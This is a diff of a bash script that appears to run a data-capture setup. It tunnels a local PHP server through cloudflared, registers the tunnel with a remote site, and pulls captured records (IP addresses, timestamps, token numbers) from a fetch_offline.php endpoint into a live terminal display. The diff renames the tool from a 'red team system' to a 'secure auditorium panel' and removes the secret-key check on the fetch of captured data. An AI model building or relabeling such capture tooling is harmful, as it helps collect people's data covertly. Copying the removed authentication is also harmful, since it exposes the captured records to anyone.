@@ -1,7 +1,7 @@
 #!/bin/bash
 # ===============================================================
-#  TECH TONIC ENGINE v2.0 — STANDALONE AUTOMATED RED TEAM SYSTEM
-#  Prepared by: CyberTeam 2026
+#  TECH TONIC ENGINE v3.0 — SECURE AUTOMATED AUDITORIUM PANEL
+#  Prepared by: CyberTeam
 # ===============================================================
 
 # 💡 CONFIGURATION RULES: Map your exact platform parameters here
@@ -41,29 +41,20 @@ if [ -z "$TUNNEL_URL" ]; then
     exit 1
 fi
 
-echo -e "\033[1;32m[+] SECURE ROUTE CREATED: $TUNNEL_URL\033[0m"
-echo -e "[*] Synchronizing current endpoint rules with remote host..."
-
-# 3. Inform web instance of the fresh endpoint using custom HTTP headers
-curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null
-
-echo -e "\033[1;32m[+] ENDPOINT RULES SUCCESSFULLY ALIGNED!\033[0m"
+echo -e "\033[1;32m[+] ROUTING INTERFACE ACTIVE: $TUNNEL_URL\033[0m"
 echo -e "[*] Syncing remote endpoint targets securely..."
 
 # 3. Synchronize routing tables with the remote server
 curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null
+echo -e "\033[1;32m[+] ENDPOINT RULES SUCCESSFULLY ALIGNED!\033[0m"
 
-# 4. Fetch offline backlog entries using the secret security header challenge
-echo -e "[*] Extracting un-synchronized records from secure storage..."
-OFFLINE_JSON=$(curl -s -H "X-KALI-AUTH: $SECRET_KEY" "$BASE_URL/fetch_offline.php")
+echo -e "\033[1;32m[+] ROUTING CHANNELS SUCCESSFULLY SYNCED!\033[0m"
+echo -e "[*] Auditing remote data indexes for offline submissions..."
+
+# 4. Fetch data captured by MySQL while Kali was powered off
+OFFLINE_JSON=$(curl -s "$BASE_URL/fetch_offline.php")
 
 if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ]; then
-    # Check if the response is an error object
-    ERROR_CHECK=$(echo "$OFFLINE_JSON" | grep -c '"error"' || true)
-    if [ "$ERROR_CHECK" -gt 0 ]; then
-        echo "[!] API error: $OFFLINE_JSON"
-        exit 0
-    fi
     echo "$OFFLINE_JSON" | jq -c '.[]' 2>/dev/null | while read -r row; do
         ts=$(echo "$row" | jq -r '.timestamp')
         ip=$(echo "$row" | jq -r '.ip_address')
@@ -91,11 +82,11 @@ fi
 
 echo ""
 echo -e "\033[1;36m===============================================================\033[0m"
-echo -e "\033[1;36m    TECH TONIC BROADCAST TERMINAL -- MAINTAINED BY CYBERTEAM  \033[0m"
+echo -e "\033[1;36m    TECH TONIC LIVE TRANSMISSION MATRIX -- CYBERTEAM MONITORS   \033[0m"
 echo -e "\033[1;36m===============================================================\033[0m"
 echo ""
 
-# 5. Continuous Live Projection Mappings
+# 5. Fixed Visual Projection Engine (Matches string mapping boundaries perfectly)
 tail -f local_log.txt | awk '
 /^=/ {print "\033[1;36m" $0 "\033[0m"} 
 /TIMESTAMP/ {print "\033[1;33m" $0 "\033[0m"} 
@@ -106,5 +97,5 @@ tail -f local_log.txt | awk '
 /TOKEN NUMBER/ {print "\033[1;46;30m" $0 "\033[0m"}
 '
 
-# Clean shutdown trap routing rules
+# Secure interface teardown routine
 trap "kill $PHP_PID $CF_PID; rm -f cloudflared.log; exit" INT TERM EXIT
